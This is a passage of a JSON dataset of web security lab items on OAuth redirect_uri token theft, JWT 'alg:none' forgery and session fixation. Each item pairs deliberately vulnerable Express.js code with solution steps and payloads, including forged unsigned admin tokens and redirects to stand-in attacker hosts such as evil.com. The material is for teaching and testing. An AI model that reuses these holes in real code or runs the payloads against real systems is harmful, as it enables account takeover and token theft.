      "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/authorize', (req, res) => { const { redirect_uri, user } = req.query; const token = 'token_' + Math.random().toString(36).substring(2); tokens[user] = token; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const user = Object.keys(tokens).find(u => `Bearer ${tokens[u]}` === auth); if (user === 'carlos') res.send('Carlos account data'); else res.status(401).send('Unauthorized'); }); app.listen(8080);",
      "payloads": [
        "Modified redirect_uri=https://attacker.com/callback",
        "OAuth URL: /authorize?redirect_uri=https://attacker.com/callback&user=carlos",
        "Authorization header: Bearer token_xxxxxx"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in login authentication",
      "Lab Description": "The application uses JWTs to manage user sessions. However, it improperly trusts the 'alg' field from user-supplied tokens without validating the signature. The application accepts tokens where 'alg' is set to 'none'. To solve: forge a valid token for the admin user and access the protected admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to capture the POST /login request and extract the JWT from the Set-Cookie header.",
        "2. Decode the JWT at jwt.io and observe the header and payload fields.",
        "3. Modify the header to use 'alg':'none' and change the payload to 'username':'admin'.",
        "4. Remove the signature part entirely and send the modified JWT in the Cookie header using Postman or Burp.",
        "5. Access /admin-dashboard and verify admin privileges."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.cookie('session', token).send('Logged in'); }); app.get('/admin-dashboard', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'admin') { return res.send('Welcome admin!'); } res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }."
      ]
    },
    {
      "Lab scenario": "Open redirect flaw in OAuth redirect_uri parameter",
      "Lab Description": "This lab implements OAuth login flow using a third-party provider. The `redirect_uri` parameter is improperly validated, allowing redirection to arbitrary domains. To solve: intercept the OAuth flow and steal an access token via redirection to a malicious endpoint under your control.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Initiate the login with OAuth from the target app and intercept the initial authorization URL using Burp Suite.",
        "2. Modify the 'redirect_uri' parameter to redirect to your malicious host (e.g., https://evil.com/callback).",
        "3. Host a listener or server on https://evil.com to capture the incoming request with the access_token.",
        "4. Complete the flow and monitor your server logs for the leaked token.",
        "5. Replay the token in an authenticated API request using Postman to retrieve the user profile and access restricted data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?access_token=1234567890abcdef`); }); app.get('/profile', (req, res) => { const { access_token } = req.query; if (access_token === '1234567890abcdef') return res.send('User profile: admin'); res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirection Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://evil.com/callback",
        "https://malicious.site/steal?access_token=1234567890abcdef",
        "redirect_uri=https://attacker.com/receive"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in authentication process",
      "Lab Description": "The login endpoint does not issue a new session identifier after successful authentication. This allows an attacker to fix a session ID before login and hijack the user session afterward. To solve: fix a session ID, get the victim to log in using it, then access their account using the same session.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to visit the site and note the session cookie issued before login (e.g., session=abcd1234).",
        "2. Send this session ID to the victim and entice them to log in while using it (via a phishing link or XSS vector).",
        "3. Once the victim logs in with the fixed session ID, reuse it to access /my-account.",
        "4. Verify you now have access to their authenticated session.",
        "5. Visit /my-account while reusing the session cookie and confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'victim', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const session = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[session] = username; return res.send('Login successful'); } res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) return res.send(`Account page for ${user}`); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "session=abcd1234",
        "GET /login with predefined cookie",
        "Cookie: session=abcd1234"
      ]
    },
    {
      "Lab scenario": "Session fixation via MFA token reuse in REST login flow",
      "Lab Description": "The application uses a RESTful login flow with 2FA implemented through a token verification endpoint. However, the token is bound to the session in an insecure way. The application reuses the 2FA token without revalidating the session context, allowing an attacker to hijack a victim's session post-authentication. To solve: Fixate your session during pre-authentication and inject a valid 2FA token generated by the victim to gain access to their account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite's Proxy to log in with your own credentials and intercept the POST /api/generate-2fa-token request.",
        "Send the 2FA generation request to Repeater, change the 'username' field to 'carlos' and capture the valid token.",
        "Start a new session using incognito mode and intercept the pre-login request to POST /api/session.",
        "Send the session cookie along with the stolen 2FA token to the POST /api/verify-2fa endpoint.",
        "Upon successful response, access /api/user-profile using the fixed session to verify account takeover."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const sessions = {}; const tokens = {}; app.use(bodyParser.json()); app.post('/api/session', (req, res) => { const sid = 'sess_' + Date.now(); sessions[sid] = { authenticated: false }; res.cookie('session', sid).json({ sid }); }); app.post('/api/generate-2fa-token', (req, res) => { const { username } = req.body; tokens[username] = '112233'; res.json({ message: 'Token sent' }); }); app.post('/api/verify-2fa', (req, res) => { const sid = req.cookies.session; const { username, token } = req.body; if (tokens[username] === token) { sessions[sid].authenticated = true; sessions[sid].user = username; return res.json({ success: true }); } res.status(403).json({ error: 'Invalid token' }); }); app.get('/api/user-profile', (req, res) => { const sid = req.cookies.session; if (sessions[sid]?.authenticated) return res.send('Welcome ' + sessions[sid].user); res.status(401).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "{\"username\":\"carlos\"}",
        "{\"username\":\"carlos\",\"token\":\"112233\"}"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
      "Lab Description": "The application integrates with a third-party OAuth provider using the implicit flow, but does not properly validate redirect URIs. This allows an attacker to inject a malicious redirection target and capture the access token from the URL fragment. To solve: Exploit the OAuth flow to extract Carlos’s access token and use it to access his private user dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open the login link to the OAuth provider and intercept the OAuth authorization request.",
        "Modify the redirect_uri parameter to point to your own server or Burp Collaborator.",
        "Trigger the OAuth login flow using Carlos’s session (use session fixation or phishing).",
        "Capture the access token leaked in the URL fragment via your redirect URI endpoint.",
        "Replay the token in the Authorization header to access the victim's /dashboard endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const tokenCache = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const token = Buffer.from(user + ':token123').toString('base64'); tokenCache[user] = token; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/dashboard', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = Buffer.from(token, 'base64').toString(); const username = decoded.split(':')[0]; if (tokenCache[username] === token) return res.send('Dashboard for ' + username); res.status(403).send('Access denied'); }); app.listen(4001);",
      "payloads": [
        "https://malicious.example.com/#access_token=carlos:token123",
        "Authorization: Bearer Y2FybG9zOnRva2VuMTIz"
      ]
    },
    {
      "Lab scenario": "JWT signature validation bypass using 'none' algorithm",
      "Lab Description": "The application uses JWT for session management. However, it incorrectly accepts tokens with the 'alg':'none' header and skips signature verification. An attacker can forge a token and impersonate any user. To solve: Create a tampered token that impersonates the admin user and access the protected admin panel.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Postman to send a GET /jwt-login request and extract your valid JWT.",
        "Decode the JWT using jwt.io or Burp Decoder and note the structure.",
        "Craft a new token with header: {\"alg\":\"none\"}, and payload: {\"user\":\"admin\"}. Remove the signature.",
        "Send the forged token in Authorization: Bearer header to /admin-dashboard.",
        "Confirm admin access and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.get('/jwt-login', (req, res) => { const token = jwt.sign({ user: 'guest' }, secret); res.send({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Not authorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
      ]
    },
    
    {
        "Lab scenario": "Session fixation vulnerability in login endpoint",
        "Lab Description": "The login mechanism assigns a session identifier before verifying credentials. This allows an attacker to fixate a session for a victim. The application reuses the session token issued prior to authentication. To solve: hijack a session by forcing a victim to authenticate using a session token you control, then access their My account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp Suite and intercept your own visit to the site before logging in. Note the Set-Cookie header assigning a session ID.",
          "Send a GET /login request with the session ID still active but without credentials to Burp Repeater.",
          "Manually craft a phishing link including your session ID and send it to the victim (simulate this by manually modifying the session cookie during login).",
          "Log in as the victim while reusing your previously fixed session ID.",
          "After successful login, access /my-account and confirm you’re authenticated as the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'sessionsecret', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'carlospw' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) { res.send('Welcome to your account, ' + req.session.username); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
        "payloads": [
          "Manually reuse pre-auth session cookie in post-auth request",
          "Fixate session ID via phishing URL with pre-issued cookie",
          "Set-Cookie: sessionID=attackersession; Path=/"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in API authorization header",
        "Lab Description": "The backend accepts JWTs signed with the 'none' algorithm. This exposes the application to JWT tampering where the payload can be altered without a valid signature. To solve: tamper with the token to elevate privileges and access the /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite or Postman to inspect a request with a valid JWT from a logged-in user.",
          "Decode the JWT and observe the header and payload fields. Notice that algorithm is set to 'HS256'.",
          "Craft a new JWT with { \"alg\": \"none\" } in the header and set the payload role to 'admin'.",
          "Remove the signature part entirely and resend the token in the Authorization header.",
          "Send a request to /admin with the tampered JWT and verify access is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', role: 'user' }, { username: 'carlos', role: 'admin' }]; app.get('/token', (req, res) => { const token = jwt.sign({ username: 'user', role: 'user' }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(400).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\", \"role\":\"admin\"}",
          "JWT: base64url(header).base64url(payload). (no signature)"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage in redirect URI through Referer header",
        "Lab Description": "The OAuth implementation uses the implicit grant type and sends tokens in the URL fragment. When redirected to an insecure third-party page, the Referer header leaks the token. To solve: extract an access token leaked via the Referer header and use it to access a protected /profile endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start a proxy in Burp Suite and initiate the OAuth login flow.",
          "Observe the URL after redirection. Notice the access_token is included in the URL fragment.",
          "Redirect the user to a malicious domain (e.g., http://evil.com) that logs the Referer header.",
          "Capture the Referer header on your malicious domain to extract the token.",
          "Use Postman to send a request to /profile with the stolen token in the Authorization header."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'token123': 'carlos' }; app.get('/auth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token123'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token123') { res.send('Sensitive data for carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Token Leakage Lab running on http://localhost:' + PORT));",
        "payloads": [
          "OAuth callback URI redirecting to http://evil.com",
          "Stolen token: Bearer token123",
          "Authorization: Bearer token123"
        ]
      },
      {
        "Lab scenario": "Session fixation in login handler logic",
        "Lab Description": "This application fails to regenerate session identifiers during login. If an attacker can trick a user into logging in with a known session ID, they can later hijack that session. The application allows unauthenticated session identifiers to persist after login. To solve: Hijack Carlos's session by fixing the session ID before login and accessing his My account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and observe the Set-Cookie: session=... header.",
          "2. Note the session value and use Burp Repeater to craft a POST /login request for the victim (Carlos), keeping the same session cookie.",
          "3. Forward the POST request with Carlos's credentials using the fixed session ID.",
          "4. In a separate browser or session, send a GET /my-account request using the same session ID in the cookie.",
          "5. Verify successful hijack by accessing Carlos's My account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnkey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account of ${req.session.user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: session=attackerKnownSessionID",
          "POST /login with Cookie: session=attackerKnownSessionID",
          "GET /my-account with Cookie: session=attackerKnownSessionID"
        ]
      },
      {
        "Lab scenario": "JWT tampering via 'alg: none' flaw",
        "Lab Description": "This lab uses JSON Web Tokens to authenticate users but improperly trusts the 'alg' field in the token header. If the server accepts tokens signed with 'alg': 'none', an attacker can forge arbitrary tokens. To solve: Forge a JWT for the admin user and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite or Postman to intercept an authenticated request and extract the JWT.",
          "2. Decode the JWT using jwt.io or jwt_tool to view the header and payload.",
          "3. Create a new JWT with the header: {\"alg\":\"none\"}, and payload: {\"user\":\"admin\"}. Do not sign the token.",
          "4. Replace the original JWT with the forged token in the Authorization header.",
          "5. Send a GET /admin request with the forged token and verify access to the admin interface."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'rootpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: username }, 'secretkey'); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.user === 'admin') res.send('Admin panel accessed'); else res.status(403).send('Access denied'); } catch (e) { res.status(400).send('JWT error'); } }); app.listen(4001, () => console.log('JWT None Exploit Lab running'));",
        "payloads": [
          "{\"alg\":\"none\"}.eyJ1c2VyIjoiYWRtaW4ifQ.",
          "Authorization: Bearer <JWT with alg none>",
          "GET /admin with forged JWT"
        ]
      },
      {
        "Lab scenario": "OAuth redirection misuse in authorization flow",
        "Lab Description": "The OAuth integration in this application incorrectly trusts the 'redirect_uri' parameter without proper validation. An attacker can manipulate this to obtain authorization codes meant for other clients. To solve: Capture a valid OAuth code issued to Carlos and use it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the OAuth authorization request and observe the redirect_uri parameter.",
          "2. Modify the redirect_uri to point to an attacker-controlled domain (http://evil.net/callback).",
          "3. Trick Carlos into clicking the manipulated OAuth URL, capturing the code from your callback server logs.",
          "4. Exchange the intercepted code for an access token via the /token endpoint.",
          "5. Use the token to access /user-info endpoint and retrieve Carlos’s profile or access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthServer = { client_id: 'client123', redirect_uri: '', users: [{ username: 'carlos' }] }; app.get('/auth', (req, res) => { const { redirect_uri, state } = req.query; oauthServer.redirect_uri = redirect_uri; const code = 'authcode-carlos'; const redirectUrl = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirectUrl); }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'authcode-carlos') res.json({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.json({ user: 'carlos', role: 'user' }); else res.status(403).send('Access denied'); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",
        "payloads": [
          "GET /auth?redirect_uri=http://evil.net/callback&state=xyz",
          "Captured code: authcode-carlos",
          "GET /token?code=authcode-carlos",
          "Authorization: Bearer token-carlos",
          "GET /user-info with access token"
        ]
      },
      {
        "Lab scenario": "JWT 'none' algorithm bypass in Authorization Header",
        "Lab Description": "This lab uses stateless JWTs to manage user sessions and relies on the `alg` claim for cryptographic validation. The application fails to enforce signature verification when the 'alg' value is set to 'none'. The application trusts the header contents without validating a signature. To solve: Forge a valid admin token and access the /admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a valid JWT from a normal login session via the Authorization: Bearer header.",
          "Send the token to Burp Decoder and decode its base64 segments to reveal the header and payload.",
          "Modify the header to: {\"alg\":\"none\"}, and the payload to: {\"username\":\"admin\",\"role\":\"admin\"}. Leave the signature empty.",
          "Re-encode the JWT segments without signing and replace the original token in the Authorization header.",
          "Send a GET request to /admin with the forged token. Confirm admin access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else if (username === 'user' && password === 'userpass') { const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = payload.payload; if (user.role === 'admin') return res.send('Welcome admin'); } try { const user = jwt.verify(token, secret); if (user.role === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "{\"alg\":\"none\"} . {\"username\":\"admin\",\"role\":\"admin\"} ."
        ]
      },
      {
        "Lab scenario": "Open redirect in OAuth login flow enables account takeover",
        "Lab Description": "The app allows login using an OAuth provider and accepts any `redirect_uri` value passed during the initial auth request. This weak validation allows redirection of access tokens to attacker-controlled domains. To solve: Steal an OAuth token and access the victim's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Open OAuth login flow in browser and observe the redirect_uri parameter.",
          "Use Burp Suite or OWASP ZAP to modify the `redirect_uri` value to point to your server (e.g., https://attacker.com/callback).",
          "Send the manipulated URL to the victim (e.g., through an embedded image or phishing email).",
          "On your server, capture the token via query string (e.g., /callback?token=XYZ).",
          "Use Postman to send a GET /account request with Authorization: Bearer <captured-token> to access the victim's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/oauth/start', (req, res) => { const client_id = 'abc123'; const redirect_uri = req.query.redirect_uri; const url = `https://provider.com/auth?response_type=token&client_id=${client_id}&redirect_uri=${redirect_uri}`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const token = req.query.token; try { const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Welcome ${userInfo.data.name}`); } catch (e) { res.status(500).send('OAuth error'); } }); const PORT = 3001; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://target.com/oauth/start?redirect_uri=https://attacker.com/callback",
          "GET /account with Authorization: Bearer <captured_token>",
          "https://attacker.com/callback?token=<token>"
        ]
      },
      {
        "Lab scenario": "Session fixation via unrotated session ID after login",
        "Lab Description": "This application assigns a session ID prior to authentication but does not issue a new session ID upon successful login. This allows an attacker to set a session ID for a victim and then log in with it, hijacking the session. To solve: Fixate a session and hijack Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to initiate a session as a guest and note the Set-Cookie: session=abc123 header.",
          "Send a phishing link with this session ID embedded in a hidden iframe or JS redirect.",
          "Once the victim logs in using this session, their session will remain bound to abc123.",
          "Use Burp Repeater to access /my-account while sending Cookie: session=abc123.",
          "Confirm access to the victim’s account page without authentication."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'password1', alice: '123456' }; app.get('/', (req, res) => { const sid = req.cookies.session || Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = sessions[sid] || { loggedIn: false, username: null }; res.send('Welcome, guest'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.send(`Logged in as ${username}`); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.status(401).send('Not logged in'); } }); const PORT = 3002; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Cookie: session=abc123",
          "<iframe src='https://target.com' style='display:none'></iframe>",
          "POST /login with Cookie: session=abc123 and body: username=carlos&password=password1",
          "GET /my-account with Cookie: session=abc123"
        ]
      },
      {
        "Lab scenario": "JWT None Algorithm Authentication Bypass in Authorization Header",
        "Lab Description": "The application uses JWT tokens for user authentication but fails to validate the token's signing algorithm properly. It trusts tokens where the 'alg' field is set to 'none', allowing attackers to forge tokens without a valid signature. The application grants access to user-specific endpoints solely based on the decoded token. To solve: Forge a valid admin-level token and access the /admin page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request after logging in as a normal user.",
          "Send the request with the JWT to Burp Decoder and decode its payload and header.",
          "Modify the 'alg' field to 'none' and change the 'username' field in payload to 'admin'.",
          "Remove the signature part from the JWT and re-encode the token.",
          "Send a request to /admin with the forged token in the Authorization header and confirm access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'my_secret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'supersecret') { const token = jwt.sign({ username: 'admin' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else if (username === 'user' && password === 'userpass') { const token = jwt.sign({ username: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') { return res.send('Welcome, admin!'); } } else { try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Welcome, admin!'); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session Fixation via URL Parameter in Cookie Assignment",
        "Lab Description": "The application improperly assigns session identifiers based on a user-controlled query parameter. When a session ID is passed in the URL, the server uses it without validation, allowing attackers to pre-define the victim's session ID. To solve: Fix a session ID for Carlos before login, then log in with his credentials and hijack the session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Using OWASP ZAP, craft a GET request to /login?sessionid=attacker123 and observe the Set-Cookie response.",
          "Copy the fixed session ID into your browser's cookie jar using developer tools or an extension like EditThisCookie.",
          "Provide Carlos's credentials to the login form without changing the session ID.",
          "After Carlos logs in, visit /my-account using the hijacked session.",
          "Verify the session hijack by confirming Carlos’s account details are visible."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const users = { 'carlos': 'password1' }; app.get('/login', (req, res) => { const sessionId = req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send(`<form method='POST' action='/authenticate?sessionid=${sessionId}'>Username:<input name='username' />Password:<input name='password' /><button>Login</button></form>`); }); const sessions = {}; app.post('/authenticate', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const sessionId = req.query.sessionid; if (users[username] === password) { sessions[sessionId] = username; res.send('Login successful'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) return res.send(`Welcome to ${user}'s account page.`); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "/login?sessionid=attacker123",
          "Set-Cookie: sessionid=attacker123",
          "POST /authenticate?sessionid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth Authorization Code Interception in OAuth Redirect Endpoint",
        "Lab Description": "The OAuth implementation is vulnerable due to an open redirect flaw in the redirect_uri parameter. Attackers can hijack the authorization code by forcing a victim to authenticate and redirect the code to a malicious domain. To solve: Intercept Carlos’s OAuth code and exchange it for an access token to access /user-info.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp and intercept the OAuth flow after initiating login with a third-party provider.",
          "Locate the redirect_uri parameter and change it to your attacker-controlled server (e.g., http://evil.com/code-stealer).",
          "Host a listener on evil.com to capture the authorization code from redirected traffic.",
          "Extract the code from the intercepted request and manually send a POST request to the token endpoint using Postman.",
          "Use the obtained access token to access /user-info as Carlos and confirm success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const users = { 'carlos': 'carlos@email.com' }; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const code = 'carlos_auth_code'; res.redirect(`${redirect}?code=${code}`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; if (code === 'carlos_auth_code') { return res.json({ access_token: 'valid_token_for_carlos' }); } res.status(400).send('Invalid code'); }); app.get('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid_token_for_carlos') { return res.send('Welcome, Carlos'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Interception Lab running on http://localhost:${PORT}`));",
        "payloads": [
